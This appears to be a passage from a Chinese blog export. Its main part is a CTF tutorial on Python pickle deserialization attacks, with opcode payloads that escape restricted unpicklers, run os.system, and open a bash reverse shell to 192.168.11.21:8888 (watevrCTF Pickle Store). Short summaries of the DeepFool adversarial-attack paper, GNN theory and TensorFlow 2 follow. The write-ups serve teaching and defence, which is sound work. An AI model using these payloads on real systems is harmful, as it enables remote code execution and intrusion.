题目将pickle能够引入的模块限定为builtins，并且设置了子模块黑名单：{'eval', 'exec', 'execfile', 'compile', 'open', 'input', '__import__', 'exit'}，于是我们能够直接利用的模块有： builtins模块中，黑名单外的子模块。 已经import的模块：io、builtins（需要先利用builtins模块中的函数） 黑名单中没有getattr，所以可以通过getattr获取io或builtins的子模块以及子模块的子模块:)，而builtins里有eval、exec等危险函数，即使在黑名单中，也可以通过getattr获得。pickle不能直接获取builtins一级模块，但可以通过builtins.globals()获得builtins；这样就可以执行任意代码了。payload为： 1234567891011121314151617181920b'''cbuiltinsgetattrp0(cbuiltinsdictS'get'tRp1cbuiltinsglobals)Rp200g1(g2S'builtins'tRp30g0(g3S'eval'tR(S'__import__(\"os\").system(\"whoami\")'tR.''' watevrCTF-2019:Pickle Store 因为题目是黑盒，所以没有黑白名单限制，直接改cookie反弹shell即可。payload： 12345b'''cossystem(S\"bash -c 'bash -i &gt;&amp; /dev/tcp/192.168.11.21/8888 0&gt;&amp;1'\"tR.''' 高校战疫网络安全分享赛:webtmp 限制中，改写了find_class函数，只能生成__main__模块的pickle： 12345class RestrictedUnpickler(pickle.Unpickler): def find_class(self, module, name): if module == '__main__': # 只允许__main__模块 return getattr(sys.modules['__main__'], name) raise pickle.UnpicklingError(\"global '%s.%s' is forbidden\" % (module, name)) 此外，禁止了b'R'： 1234try: pickle_data = request.form.get('data') if b'R' in base64.b64decode(pickle_data): return 'No... I don\\'t like R-things. No Rabits, Rats, Roosters or RCEs.' 目标是覆盖secret中的验证，由于secret被主程序引入，是存在于__main__下的secret模块中的，所以可以直接覆盖掉，此时就成功绕过了限制： 1234567891011b'''c__main__secret(S'name'S\"1\"S\"category\"S\"2\"db0(S\"1\"S\"2\"i__main__Animal.''' 除了以上这些题外，还有BalsnCTF:pyshv1-v3和SUCTF-2019:guess_game四道题，由于手动写还是比较麻烦，在后文中使用pker工具完成。 pker使用说明 简介 pker是由@eddieivan01编写的以仿照Python的形式产生pickle opcode的解析器，可以在https://github.com/eddieivan01/pker下载源码。 使用pker，我们可以更方便地编写pickle opcode（生成pickle版本0的opcode）。 再次建议，在能够手写opcode的情况下使用pker进行辅助编写，不要过分依赖pker。 此外，pker的实现用到了python的ast（抽象语法树）库，抽象语法树也是一个很重要东西，有兴趣的可以研究一下ast库和pker的源码，由于篇幅限制，这里不再叙述。 pker能做的事 引用自https://xz.aliyun.com/t/7012#toc-5： 变量赋值：存到memo中，保存memo下标和变量名即可 函数调用 类型字面量构造 list和dict成员修改 对象成员变量修改 具体来讲，可以使用pker进行原变量覆盖、函数执行、实例化新的对象。 使用方法与示例 pker中的针对pickle的特殊语法需要重点掌握（后文给出示例） 此外我们需要注意一点：python中的所有类、模块、包、属性等都是对象，这样便于对各操作进行理解。 pker主要用到GLOBAL、INST、OBJ三种特殊的函数以及一些必要的转换方式，其他的opcode也可以手动使用： 12345678910111213141516171819202122232425262728293031323334353637383940以下module都可以是包含`.`的子module调用函数时，注意传入的参数类型要和示例一致对应的opcode会被生成，但并不与pker代码相互等价GLOBAL对应opcode：b'c'获取module下的一个全局对象（没有import的也可以，比如下面的os）：GLOBAL('os', 'system')输入：module,instance(callable、module都是instance) INST对应opcode：b'i'建立并入栈一个对象（可以执行一个函数）：INST('os', 'system', 'ls') 输入：module,callable,para OBJ对应opcode：b'o'建立并入栈一个对象（传入的第一个参数为callable，可以执行一个函数））：OBJ(GLOBAL('os', 'system'), 'ls') 输入：callable,paraxxx(xx,...)对应opcode：b'R'使用参数xx调用函数xxx（先将函数入栈，再将参数入栈并调用）li[0]=321或globals_dic['local_var']='hello'对应opcode：b's'更新列表或字典的某项的值xx.attr=123对应opcode：b'b'对xx对象进行属性设置return对应opcode：b'0'出栈（作为pickle.loads函数的返回值）：return xxx # 注意，一次只能返回一个对象或不返回对象（就算用逗号隔开，最后也只返回一个元组） 注意： 由于opcode本身的功能问题，pker肯定也不支持列表索引、字典索引、点号取对象属性作为左值，需要索引时只能先获取相应的函数（如getattr、dict.get）才能进行。但是因为存在s、u、b操作符，作为右值是可以的。即“查值不行，赋值可以”。 pker解析S时，用单引号包裹字符串。所以pker代码中的双引号会被解析为单引号opcode: 12test=\"123\"return test 被解析为： 1b\"S'123'\\np0\\n0g0\\n.\" pker：全局变量覆盖 覆盖直接由执行文件引入的secret模块中的name与category变量： 1234secret=GLOBAL('__main__', 'secret') # python的执行文件被解析为__main__对象，secret在该对象从属下secret.name='1'secret.category='2' 覆盖引入模块的变量： 12game = GLOBAL('guess_game', 'game')game.curr_ticket = '123' 接下来会给出一些具体的基本操作的实例。 pker：函数执行 通过b'R'调用： 1234s='whoami'system = GLOBAL('os', 'system')system(s) # `b'R'`调用return 通过b'i'调用： 1INST('os', 'system', 'whoami') 通过b'c'与b'o'调用： 1OBJ(GLOBAL('os', 'system'), 'whoami') 多参数调用函数 12INST('[module]', '[callable]'[, par0,par1...])OBJ(GLOBAL('[module]', '[callable]')[, par0,par1...]) pker：实例化对象 实例化对象是一种特殊的函数执行 12345678animal = INST('__main__', 'Animal','1','2')return animal# 或者animal = OBJ(GLOBAL('__main__', 'Animal'), '1','2')return animal 其中，python原文件中包含： 12345class Animal: def __init__(self, name, category): self.name = name self.category = category 也可以先实例化再赋值： 1234animal = INST('__main__', 'Animal')animal.name='1'animal.category='2'return animal 手动辅助 拼接opcode：将第一个pickle流结尾表示结束的.去掉，两者拼接起来即可。 建立普通的类时，可以先pickle.dumps，再拼接至payload。 pker：CTF实战 在实际使用pker时，首先需要有大概的思路，保证能做到手写每一步的opcode，然后使用pker对思路进行实现。 Code-Breaking: picklecode 解析思路见前文手写opcode的CTF实战部分，pker代码为： 12345678getattr=GLOBAL('builtins','getattr')dict=GLOBAL('builtins','dict')dict_get=getattr(dict,'get')glo_dic=GLOBAL('builtins','globals')()builtins=dict_get(glo_dic,'builtins')eval=getattr(builtins,'eval')eval('print(\"123\")')return BalsnCTF:pyshv1 题目的find_class只允许sys模块，并且对象名中不能有.号。意图很明显，限制子模块，只允许一级模块。 sys模块有一个字典对象modules，它包含了运行时所有py程序所导入的所有模块，并决定了python引入的模块，如果字典被改变，引入的模块就会改变。modules中还包括了sys本身。我们可以利用自己包含自己这点绕过限制，具体过程为： 由于sys自身被包含在自身的子类里，我们可以利用这点使用s赋值，向后递进一级，引入sys.modules的子模块：sys.modules['sys']=sys.modules，此时就相当于sys=sys.modules。这样我们就可以利用原sys.modules下的对象了，即sys.modules.xxx。 首先获取modules的get函数，然后类似于上一步，再使用s把modules中的sys模块更新为os模块：sys['sys']=sys.get('os')。 使用c获取system，之后就可以执行系统命令了。 整个利用过程还是很巧妙的，pker代码为： 12345678modules=GLOBAL('sys', 'modules')modules['sys']=modulesmodules_get=GLOBAL('sys', 'get')os=modules_get('os')modules['sys']=ossystem=GLOBAL('sys', 'system')system('whoami')return BalsnCTF:pyshv2 与v1类似，题目的find_class只允许structs模块，并且对象名中不能有.号，只允许一级模块。其中，structs是个空模块。但是在find_class中调用了__import__函数： 1234567class RestrictedUnpickler(pickle.Unpickler): def find_class(self, module, name): if module not in whitelist or '.' in name: raise KeyError('The pickle is spoilt :(') module = __import__(module) # 注意这里调用了__import__ return getattr(module, name) 注意python的以下几条性质： __builtins__是所有模块公有的字典，记录所有内建函数，可以通过对__builtins__内相应key对应函数的修改劫持相应的函数。由于题目调用了__import__函数，我们可以通过修改__import__劫持getattr函数。 __dict__列表储存并决定了一个对象的所有属性，如果其内容被改变，属性也会改变。 c的实现过程调用了find_class函数（顺带一提，它实际上是先import再调用find_class，但是由于python的import语句其实是使用了五个参数调用的__import，无法利用），而本题的find_class中多调用了一次__imoprt__，随后调用getattr，这包含了一个查值的过程，这一点很重要。 然后我们理一下利用过程： 目标：structs.__builtins__['eval']→需要structs.__builtins__.get函数。 实现二级跳转：劫持__import__为structs.__getattribute__，opcodecstructs变为structs.__getattribute__(structs).xxx。 结合1、2：structs.__getattribute__(structs)要返回structs.__builtins__；xxx则设置为get。 利用structs.__dict__对structs赋值新属性structs.structs为structs.__builtins__，以便structs.__getattribute__(structs)返回structs.__builtins__。 pker实现： 123456789__dict__ = GLOBAL('structs', '__dict__') # structs的属性dict__builtins__ = GLOBAL('structs', '__builtins__') # 内建函数dictgtat = GLOBAL('structs', '__getattribute__') # 获取structs.__getattribute____builtins__['__import__'] = gtat # 劫持__import__函数__dict__['structs'] = __builtins__ # 把structs.structs属性赋值为__builtins__builtin_get = GLOBAL('structs', 'get') # structs.__getattribute__('structs').geteval = builtin_get('eval') # structs.structs['eval']（即__builtins__['eval']eval('print(123)')return BalsnCTF:pyshv3 v3的find_class与v1类似，并限制了structs模块，与v1和v2不同的是，v3的flag是由程序读取的，不用达到RCE权限。关键代码为： 1234567891011121314151617181920212223242526272829303132333435363738394041424344class Pysh(object): def __init__(self): self.key = os.urandom(100) self.login() self.cmds = &#123; 'help': self.cmd_help, 'whoami': self.cmd_whoami, 'su': self.cmd_su, 'flag': self.cmd_flag, &#125; def login(self): with open('../flag.txt', 'rb') as f: flag = f.read() flag = bytes(a ^ b for a, b in zip(self.key, flag)) user = input().encode('ascii') user = codecs.decode(user, 'base64') user = pickle.loads(user) print('Login as ' + user.name + ' - ' + user.group) user.privileged = False user.flag = flag self.user = user def run(self): while True: req = input('$ ') func = self.cmds.get(req, None) if func is None: print('pysh: ' + req + ': command not found') else: func() ... def cmd_flag(self): if not self.user.privileged: print('flag: Permission denied') else: print(bytes(a ^ b for a, b in zip(self.user.flag, self.key)))if __name__ == '__main__': pysh = Pysh() pysh.run() 程序先进行一次pickle反序列化，self.user.privileged被设置为False，然后进入命令执行循环流程，而且提供cmd_flag函数，如果self.user.privileged为True，就会返回flag。 当类实现了__get__、__set__和__delete__任一方法时，该类被称为“描述器”类，该类的实例化为描述器。对于一个某属性为描述器的类来说，其实例化的对象在查找该属性或设置属性时将不再通过__dict__，而是调用该属性描述器的__get__、__set__或__delete__方法。需要注意的是，一个类必须在声明时就设置属性为描述器，使之成为类属性，而不是对象属性，此时描述器才能起作用。 所以，如果我们设置User类的__set__函数，它就成为了描述器；再将它设置为User类本身的privileged属性时，该属性在赋值时就会调用__set__函数而不会被赋值，从而绕过赋值获得flag。 pker代码为： 1234567User=GLOBAL('structs','User')User.__set__=GLOBAL('structs','User') # 使User成为描述器类des=User('des','des') # 描述器User.privileged=des # 注意此处必须设置描述器为类的属性，而不是实例的属性user=User('hachp1','hachp1') # 实例化一个User对象return user watevrCTF-2019: Pickle Store 解析思路见前文手写opcode的CTF实战部分，pker代码为： 123system=GLOBAL('os', 'system')system('bash -c \"bash -i &gt;&amp; /dev/tcp/192.168.11.21/8888 0&gt;&amp;1\"')return SUCTF-2019:guess_game 题目是一个猜数字游戏，每次对输入的数据反序列化作为ticket，并与随机生成的ticket进行对比，猜对10次就给flag。find_class函数限制了guess_game模块并禁止了下划线（魔术方法、变量）： 1234567class RestrictedUnpickler(pickle.Unpickler): def find_class(self, module, name): # Only allow safe classes if \"guess_game\" == module[0:10] and \"__\" not in name: return getattr(sys.modules[module], name) # Forbid everything else. raise pickle.UnpicklingError(\"global '%s.%s' is forbidden\" % (module, name)) 直接作弊用pickle改game.ticket为猜测的ticket，然后把win_count和round_count都改为9（因为还要进行一轮，round_count必须大于10才会出现输赢判断，而给flag的依据是win_count等于10轮），pickle伪代码： 1234567ticket=INST('guess_game.Ticket','Ticket',(1))game=GLOBAL('guess_game','game')game.win_count=9game.round_count=9game.curr_ticket=ticketreturn ticket 高校战疫网络安全分享赛: webtmp 解析思路见前文手写opcode的CTF实战部分，pker代码为： 12345secret=GLOBAL('__main__', 'secret') # python的执行文件被解析为__main__对象，secret在该对象从属下secret.name='1'secret.category='2'animal = INST('__main__', 'Animal','1','2')return animal 后记 为了解决pickle反序列化的问题，官方给出了使用改写 Unpickler.find_class() 方法，引入白名单的方式来解决，并且给出警告：对于允许反序列化的对象必须要保持警惕。对于开发者而言，如果实在要给用户反序列化的权限，最好使用双白名单限制module和name并充分考虑到白名单中的各模块和各函数是否有危险。 CTF中，pickle相关的题目一般考察对python本身（如对魔术方法和属性等）的深度理解，利用过程可以很巧妙。 由于pickle“只能赋值，不能查值”的特性，唯一能够根据键值查询的操作就是find_class函数，即c、i等opcode，如何根据特有的魔术方法、属性等找到突破口是关键；此外，在利用过程中，往往会借助getattr、get等函数。 借助pker可以比较方便的编写pickle的opcode，该工具是做题利器。 本文涉及的CTF题目已整理至github：https://github.com/HACHp1/pickle_ctf_collection 参考资料 官方文档：pickle — Python 对象序列化 How pickle works in Python blackhat-Sour Pickle: A serialised exploitation guide in one part 一篇文章带你理解漏洞之 Python 反序列化漏洞 通过AST来构造Pickle opcode pker Code-Breaking中的两个Python沙箱 从Balsn CTF pyshv学习python反序列化 利用python反序列化覆盖秘钥——watevrCTF-2019: Pickle Store的第二种解法","categories":[{"name":"Web安全","slug":"Web安全","permalink":"https://hachp1.github.io/categories/Web安全/"}],"tags":[{"name":"Web安全","slug":"Web安全","permalink":"https://hachp1.github.io/tags/Web安全/"}]},{"title":"DeepFool: a simple and accurate method to fool deep neural networks浅读","slug":"DeepFool-a-simple-and-accurate-method-to-fool-deep-neural-networks浅读","date":"2020-02-20T04:56:07.000Z","updated":"2025-02-06T15:11:50.565Z","comments":true,"path":"posts/对抗样本/20200220-deepfool.html","link":"","permalink":"https://hachp1.github.io/posts/对抗样本/20200220-deepfool.html","excerpt":"DeepFool: a simple and accurate method to fool deep neural networks浅读 DeepFool: a simple and accurate method to fool deep neural networks浅读 简介 二分类下的公式证明 证明 多类别 其他结论 经过小实验得到的一些结论 代码 注意事项 改变overshoot值得到生成样本 总结 参考资料","text":"DeepFool: a simple and accurate method to fool deep neural networks浅读 DeepFool: a simple and accurate method to fool deep neural networks浅读 简介 二分类下的公式证明 证明 多类别 其他结论 经过小实验得到的一些结论 代码 注意事项 改变overshoot值得到生成样本 总结 参考资料 简介 Deepfool可做无目标攻击与有目标攻击，无目标攻击时遍历所有类并找到样本变化最小的；有目标攻击则针对该类的超平面进行。 Deepfool是基于超平面分类思想的一种对抗样本生成方法。众所周知，在二分类问题中，超平面是实现分类的基础 ，那么要改变某个样本 x 的分类，最小的扰动就是将 x 挪到超平面上，这个距离的代价最小。多分类的问题也是类似。 Deepfool使用该处的切平面与0水平面的交线作为决策边界的近似，所以并不能找到最小的距离（除非分类器为线性）。 Deepfool的思想是，每次迭代求出该位置的切平面（使用切平面近似代替整个预测函数），然后将该样本点移动到切平面对应的函数值为0的位置。 示意图 二分类下的公式证明 deepfool使用的迭代公式为（第i次扰动的计算，注意此时假设样本点处函数值为正，目的是要将其识别为负，即0所对应曲线为决策边界；反之需要修改梯度的方向）： \\[ \\boldsymbol{r_i}=-\\frac{f(\\boldsymbol{x_i})}{||\\nabla f(\\boldsymbol{x_i})||^2_2}\\nabla f(\\boldsymbol{x_i}) \\] 证明 定义以及约定： \\[ 为了便于理解，在三维坐标o-xyz内给出证明，\\\\其中，x与y对应数据的特征X（该数据有两个特征），z对应f的输出值；\\\\ f(x, y)→z: 输入为数据，输出为二分类函数的softmax之前一层；\\\\X_0为数据点，其对应的z（即z_0）有：z_0&gt;0，需要使之小于0而达到攻击效果；\\\\X_0&#39;为X_0在z=0上的投影\\\\ f(x)=0为决策边界\\\\证明过程：\\\\ 易得曲面f(x, y)-z=0在X_0处的切平面方程：\\\\ f&#39;_{x_0}(x-x_0)+f&#39;_{y_0}(y-y_0)-(z-z_0)=0\\\\ 令z=0，得切平面与z=0的交线l:f_{x_0}&#39;(x-x_0)+f_{y_0}&#39;(y-y_0)+z_0=0\\\\ 化简得l:f&#39;_{x_0}x+f&#39;_{y_0}y-f&#39;_{x_0}x_0-f&#39;_{y_0}y_0+z_0=0\\\\ 点X_0&#39;到l的距离d为：\\\\ \\frac{|f&#39;_{x_0}x_0+f&#39;_{y_0}y_0-f&#39;_{x_0}x_0-f&#39;_{y_0}y_0+z_0|}{\\sqrt{f&#39;^2_{x_0}+f&#39;^2_{y_0}}}=\\frac{|z_0|}{\\sqrt{f&#39;^2_{x_0}+f&#39;^2_{y_0}}}\\\\ 又有f(x_0, y_0)=z_0&gt;0 ∴d=\\frac{f(x_0, y_0)}{\\sqrt{f&#39;^2_{x_0}+f&#39;^2_{y_0}}}\\\\交线l的法向量为：(f&#39;_{x_0}, f&#39;_{y_0}) \\] 整理一下，可以得到结论： \\[ \\frac{f(\\boldsymbol{x_i})}{||\\nabla f(\\boldsymbol{x_i})||_2} 为点x_i到决策边界近似直线（近似直线的定义见前文）的距离\\\\ \\frac{\\nabla f(\\boldsymbol{x_i})}{||\\nabla f(\\boldsymbol{x_i})||_2} 为单位法向量（也是梯度方向的单位向量）\\\\ 所以两者相乘再乘-1即将点平移到近似决策边界的向量 \\] 多类别 由二分类比较容易推广到多分类： \\[ 令h(x)=f_{orig}(x)-f_{t}(x) \\] \\[ 其中，f_{orig}是原类别的对应函数；f_{t}是目标类别的对应函数 \\] \\[ 若攻击成功，则f_{t}(x_i)所对softmax大于f_{orig}(x_i)所对softmax \\] \\[ 则f_{t}(x_i)&gt;f_{orig}(x_i) \\] \\[ ∴ 当h(x)&lt;=0时达到攻击目的，此时即转化为二分类一样的情况 \\] 需要注意的是，多分类一次迭代时会计算所有其他非原类的变化距离，并采用变化距离最小的类作为此步的动作。 此外，由于deepfool所求距离只能将点移动到决策边界上，实际移动时需要多移动一点以越过边界。 多分类deepfool的伪代码如下： pseudo_code 论文同时指出，伪代码中使用\\(l_2\\)范数作为扰动大小的判断依据，但是只要将10行和11行的2换成p，就可以使用任意范数作为扰动依据。 其他结论 论文提出了使用deepfool方法得到的扰动和数据点X的第二范数的比值作为衡量各模型鲁棒性的标准（该数值越大，鲁棒性越强），并给出了对LeNet等模型的测评结果。 论文使用deepfool与fgsm对比，deepfool得到的扰动要远小于fgsm。 论文指出，DF可以在3次迭代之内就找出对抗样本，其效率较其他方法更高。 论文还使用deepfool和fgsm对不同模型进行对抗训练，并使用deepfool对其鲁棒性进行评估，得到了deepfool对抗训练效果更好、还能够略微提高原模型的准确性(fgsm则会降低准确性)。fgsm的对抗训练反而使鲁棒性降低了；但是增大扰动的大小再进行对抗训练时，deepfool也使鲁棒性降低了。得出如果扰动较大，对抗训练反而会使鲁棒性降低（同时给出解释：当扰动过大时，数据被“真正地”改为另一类别的数据）。 df鲁棒性能够衡量测试集的准确率，（脑洞）可能可以作为指导finetune提前截止的依据（提前终止这个操作并没有什么依据）；同时，在对抗训练时可以调缓学习率。 经过小实验得到的一些结论 代码 参考了LTS4，经过压缩修正的代码主要流程如下： 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152while k_i == label and loop_i &lt; max_iter: pert = np.inf one_hot_label_0 = tf.one_hot(label, class_num) with tf.GradientTape() as tape: tape.watch(x) fs = model(x) loss_value = loss_func(fs, I, 0) grad_orig = tape.gradient(loss_value, x) for k in range(1, class_num): one_hot_label_k = tf.one_hot(I[k], class_num) with tf.GradientTape() as tape: tape.watch(x) fs = model(x) loss_value = loss_func(fs, I, k) cur_grad = tape.gradient(loss_value, x) # set new w_k and new f_k w_k = cur_grad - grad_orig f_k = (fs[0, I[k]] - fs[0, I[0]]).numpy() pert_k = abs(f_k) / (np.linalg.norm(tf.reshape(w_k, [-1]))) # determine which w_k to use if pert_k &lt; pert: pert = pert_k w = w_k # compute r_i and r_tot # Added 1e-4 for numerical stability r_i = (pert + 1e-4) * w / np.linalg.norm(w) r_tot = np.float32(r_tot + r_i) pert_image = sample + (1 + overshoot) * r_tot # 压缩至可行域 pert_image = tf.clip_by_value(pert_image, * model_field) x = tf.Variable(pert_image) fs = model(x) k_i = np.argmax(np.array(fs).flatten()) loop_i += 1 r_tot = (1 + overshoot) * r_tot 注意事项 由于求梯度的灵敏度问题，deepfool使用 softmax 之前的一层作为输入，否则效果很差。 改变overshoot值得到生成样本 比较有趣的是，通过加大overshoot值，得到的图片人工也能识别成另一种图像，这与GAN得到的生成结果非常类似： 总结 论文提出了deepfool对抗攻击算法，该算法效果超越了IFGSM等算法。 论文提出了基于DF对模型抵抗扰动的鲁棒性进行评估的方法。 论文指出DF在加大overshoot值时，真正地产生了其他类别的数据。 论文指出DF的对抗训练可以增大模型的准确率和鲁棒性。 参考资料 Moosavi-Dezfooli S M, Fawzi A, Frossard P. Deepfool: a simple and accurate method to fool deep neural networks[C]//Proceedings of the IEEE conference on computer vision and pattern recognition.2016: 2574-2582.","categories":[{"name":"对抗样本","slug":"对抗样本","permalink":"https://hachp1.github.io/categories/对抗样本/"}],"tags":[{"name":"对抗样本","slug":"对抗样本","permalink":"https://hachp1.github.io/tags/对抗样本/"}]},{"title":"GNN初探，The graph neural network model浅析","slug":"GNN初探，The-graph-neural-network-model浅析","date":"2020-02-07T15:20:34.000Z","updated":"2025-02-06T15:11:50.688Z","comments":true,"path":"posts/机器学习/20200207-GNN_0.html","link":"","permalink":"https://hachp1.github.io/posts/机器学习/20200207-GNN_0.html","excerpt":"GNN初探，The graph neural network model浅析 目录 GNN初探，The graph neural network model浅析 图神经网络的任务分类 图神经网络的计算与优化过程 设计思路 数学定义 从单个节点总体认知GNN训练的大概流程 不动点的计算过程 反向传播 伪代码 Transition与Output函数的几种实现（原论文） 后记 参考资料","text":"GNN初探，The graph neural network model浅析 目录 GNN初探，The graph neural network model浅析 图神经网络的任务分类 图神经网络的计算与优化过程 设计思路 数学定义 从单个节点总体认知GNN训练的大概流程 不动点的计算过程 反向传播 伪代码 Transition与Output函数的几种实现（原论文） 后记 参考资料 图神经网络的任务分类 图神经网络的任务主要分为：graph-focused、node-focused；其中，graph-focused关心的是对整个图的分类，node-focused则更加精细，是以图中各节点为对象进行任务。 graph-focused任务需要人为添加一个node用来代表整个神经网络的输出，从而与node-focused相统一。 图神经网络的计算与优化过程 设计思路 一般的嵌入方法难以生成稳定的嵌入网络，而GNN设计时紧靠Banach不动点理论进行，通过不动点的稳定性巧妙地得到可以稳定训练的网络。但是由于不动点的引进，训练过程较普通的神经网络更复杂。GNN的梯度下降过程由于不动点的引进不能直接使用，需要通过特定的公式进行更新。 数学定义 图G：\\((N, E)\\)，其中\\(N\\)表示节点（node）集合，\\(E\\)表示边（edge）集合。 \\(ne[n]\\)表示节点\\(n\\)的邻居节点集合 \\(co[n]\\)表示以节点\\(n\\)为顶点的边的集合。 \\(l_n∈R^{lN}\\)表示节点\\(n\\)​的特征向量。 \\(l_{(n_1, n_2)}∈R^{lE}\\)表示边\\((n_1, n_2)\\)的特征向量 \\(l\\)表示所有特征向量拼接的向量 从单个节点总体认知GNN训练的大概流程 GNN的训练过程与传统机器学习不同，每一大步训练都分为两个阶段： 图网络计算（更新的是各节点的状态值，依据Banach不动点理论，迭代出状态的收敛点） 输出网络的训练（更新嵌入神经网络和输出神经网络的权重，根据特定的问题定制的LOSS函数使用梯度下降对输出网络的参数进行更新） 经过以上这两步反复迭代多次，即可将GNN训练完成。 GNN的单个节点输入该点的状态值以及与其相关联的边特征、节点特征；输出为该节点的状态值（最后得到的状态值是不动点） 不动点的计算过程 GNN中有两种主要函数（都包含待更新的权值，但求不动点时不更新）： global transition function \\(f_w\\)与 global output function \\(g_w\\)。 global transition function 将该点状态值、节点的邻居节点和邻接边的数据映射为该节点的状态值。 global output function 则根据具体任务将节点的状态值、节点的邻居节点和邻接边的数据映射为输出的结果。对于位置图（positional graph）（需要考虑节点之间的相对位置，如：在上方或下方连接）需要在\\(f_w\\)中加入inject函数：\\(\\upsilon_n:ne[n]\\to{1,...|N|}\\)以加入相对位置信息。 两个函数的定义如下（节点\\(n\\)的状态表示为\\(x_n∈R^{s}\\)）： \\[x_n=f_w(l_n, l_{co[n]}, x_{ne[n]}, l_{ne[n]})\\] \\[o_n=g_w(x_n, l_n)\\] 依据Banach不动点理论（原论文是将整个图中所有节点的\\(f_w\\)与\\(g_w\\)分别叠加为\\(F_w\\)与\\(G_w\\)，根据不动点理论得出的结果，即每次把所有节点的特征值叠在一起当输入，输出所有节点的拼接值；单看一个节点，则有以下结论），以上两式可以迭代求出不动点： \\[x_n(t+1)=f_w(l_n, l_{co[n]}, x_{ne[n]}(t), l_{ne[n]})\\] \\[o_n(t)=g_w(x_n(T), l_n), n∈N\\] 迭代求不动点的过程与嵌入类似（将一个节点的图信息转化为特征向量），可以看作图embedding。 反向传播 迭代出不动点后，针对目标任务的LOSS函数，使用梯度下降等算法对\\(f_w\\)与\\(g_w\\)中的权重进行更新。但是由于不动点的引进不能像普通神经网络直接使用，需要通过特定的公式进行更新。 LOSS函数定义如下： \\[ e_w=\\sum^{p}_{i=1}\\sum^{q_i}_{j=1}(t_{i, j}-\\varphi_w(G_i, n_{i, j}))^2 \\] \\[ 其中，t为数据的正确分类，\\varphi_w(G, n)=[G_w(\\Psi(w), l_N)]_n \\] \\[ \\Psi(w)=F_w(\\Psi(w), l) \\] 首先，引入中间函数\\(z(t)\\)： \\[ z(t)=z(t+1)\\cdot\\frac{\\partial F_w}{\\partial x}(x, l)+\\frac{\\partial e_w}{\\partial o}\\cdot\\frac{\\partial G_w}{\\partial x}(x, l_N) \\] 经证明，序列\\(z(t), z(t-1), ...\\)收敛至一个向量\\(z\\)，即\\(z=\\lim_{t \\to -\\infty}z(t)\\)，并且收敛速度为指数级收敛，且与\\(z(T)\\)初值无关。 此外，还存在： \\[ \\frac{\\partial e_w}{\\partial w}=\\frac{\\partial e_w}{\\partial o}\\cdot\\frac{\\partial G_w}{\\partial x}(x, l_N)+z\\cdot\\frac{\\partial F_w}{\\partial w}(x, l), 其中，x为GNN的稳定状态 \\] GNN即使用上式进行梯度下降。 伪代码 整个训练过程的伪代码如下： GNN伪代码 Transition与Output函数的几种实现（原论文） 由于要使用Banach不动点理论，\\(f_w\\)需要满足一定的条件（\\(g_w\\)不用满足，原文直接使用DNN） 原文给出了两种可用的\\(f_w\\)。 两种方法都基于将\\(f_w(l_n, l_{co[n]}, x_{ne[n]}, l_{ne[n]})\\)改写成 \\[ \\sum_{u\\in ne[n]}h_w(l_n,l_{(n,u)},x_u,l_u),n\\in N \\] 即，对各邻居节点计算\\(h_w\\)之后求和。然后在此基础上分为Linear和nonLinear两种。 Linear(nonpositional) GNN \\[ h_w(l_n,l_{(n,u)},x_u,l_u)=A_{n,u}x_u+b_n \\] \\[ A_{n,u}=\\frac{\\mu}{s|ne[u]|}\\cdot resize(\\phi_w(l_n,l_{n,u},l_u)) \\] 其中，s为状态向量的维度，即节点个数；\\(\\phi_w\\)函数为一层激活函数为\\(tanh\\)（或其他使\\(f_w\\)满足压缩映射条件的激活函数）的DNN \\[ b_w=\\rho_w(l_n) \\] \\(b_w\\)将特征向量映射为与节点数相同维度的向量。 Nonelinear(nonpositional) GNN \\(h_w\\)为DNN，但LOSS函数添加一个惩罚项以保证\\(F_w\\)为压缩映射函数： \\[ e_w=\\sum^{p}_{i=1}\\sum^{q_i}_{j=1}(t_{i, j}-\\varphi_w(G_i, n_{i, j}))^2+\\beta L(\\left\\|\\frac{\\partial F_w}{\\partial x}\\right\\|) \\] \\[ 其中，L(y)在y&gt;\\mu时为(y-\\mu)^2，在y\\leq\\mu时为0，\\mu \\in (0,1),\\mu被称为F_w的压缩系数 \\] 后记 GNN的数据在网络的训练中与一般的神经网络不同，GNN会将每个数据单独建立为一个节点，并且在每一大步训练中对整个图更新。 节点的状态值实际上为图嵌入，与词嵌入的思想一致。 GNN与普通神经网络的最大区别在于图嵌入的过程、压缩映射函数的选择和训练（前向传播中的迭代操作）。 参考资料 https://ieeexplore.ieee.org/document/4700287 https://zhuanlan.zhihu.com/p/76290138","categories":[{"name":"机器学习","slug":"机器学习","permalink":"https://hachp1.github.io/categories/机器学习/"}],"tags":[{"name":"机器学习-算法","slug":"机器学习-算法","permalink":"https://hachp1.github.io/tags/机器学习-算法/"}]},{"title":"Tensorflow2入门","slug":"Tensorflow2入门","date":"2019-11-28T13:45:08.000Z","updated":"2025-02-06T15:11:51.038Z","comments":true,"path":"posts/机器学习/20191128-tf2_learning.html","link":"","permalink":"https://hachp1.github.io/posts/机器学习/20191128-tf2_learning.html","excerpt":"Tensorflow2入门 前言 最近更新了TF2，发现以前的TF代码都跑不了了。改动是真的很大。并且在重写原来的代码的时候遇到了很多坑，在这里记录一下学习过程。 没有安装TF2之前，我对其印象停留在TF2强行引入了keras。但是我上手的时候受到了震惊：placeholder与session都被删除了。。。 官方有一个简单的代码升级脚本，但是其仅仅是把tf替换为tf.compat.v1，并没有太大的作用。 由于我个人对keras的便捷、代码易读性比较喜欢，所以对新版本并不排斥。但是如果只用keras，底层的很多操作就不支持了，比如训练的单步进行。所以需要学习TF2或者keras中更底层的部分。","text":"Tensorflow2入门 前言 最近更新了TF2，发现以前的TF代码都跑不了了。改动是真的很大。并且在重写原来的代码的时候遇到了很多坑，在这里记录一下学习过程。 没有安装TF2之前，我对其印象停留在TF2强行引入了keras。但是我上手的时候受到了震惊：placeholder与session都被删除了。。。 官方有一个简单的代码升级脚本，但是其仅仅是把tf替换为tf.compat.v1，并没有太大的作用。 由于我个人对keras的便捷、代码易读性比较喜欢，所以对新版本并不排斥。但是如果只用keras，底层的很多操作就不支持了，比如训练的单步进行。所以需要学习TF2或者keras中更底层的部分。 爬过的坑，尝试直接将keras和TF底层结构拼接在一起 由于keras被引入了，我有一个大胆的猜想：把keras高层API和TF底层代码直接接在一起： 1234567def bin_reg_model(): inputs = layers.Input(shape=(1,), dtype=np.float32) h1 = layers.Dense(1, input_shape=(1,))(inputs) outputs = tf.multiply(w, h1) + b model = tf.keras.models.Model(inputs=inputs, outputs=outputs) model.summary() return model 运行的时候发现不可行，报错显示有参数不能被训练 